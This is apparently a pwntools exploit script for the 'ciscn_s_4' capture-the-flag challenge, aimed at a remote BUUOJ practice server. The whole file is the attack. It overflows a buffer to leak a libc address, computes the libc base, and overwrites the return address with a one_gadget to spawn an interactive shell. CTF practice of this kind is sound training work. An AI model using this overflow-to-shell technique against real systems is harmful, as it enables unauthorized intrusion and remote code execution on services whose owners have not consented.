from pwn import *
# context.log_level='debug'
# sh=process("./ciscn_s_4")
sh=remote("node4.buuoj.cn","25866")
libc=ELF("libc-2.27.so")
# libc=ELF("/lib/i386-linux-gnu/libc.so.6")

sh.recvuntil("?")
payload="a"*0x20
sh.sendline(payload)

sh.recvuntil("\n")
sh.recvuntil("\n")

sh.recv(15)
dl_fini=u32(sh.recv(4))
log.info("dl_fini: "+hex(dl_fini))
libc_base=dl_fini-0x1f0b40-libc.sym['__libc_start_main']-0xe0
log.info("libc_base:"+hex(libc_base))
gets_addr=libc_base+libc.symbols['gets']
one_addr=libc_base+0x3cbea
log.info("one_addr: "+hex(one_addr))
# gdb.attach(sh)
payload2='a'*(0x30-0x4)+p32(one_addr)
sh.sendline(payload2)


sh.interactive()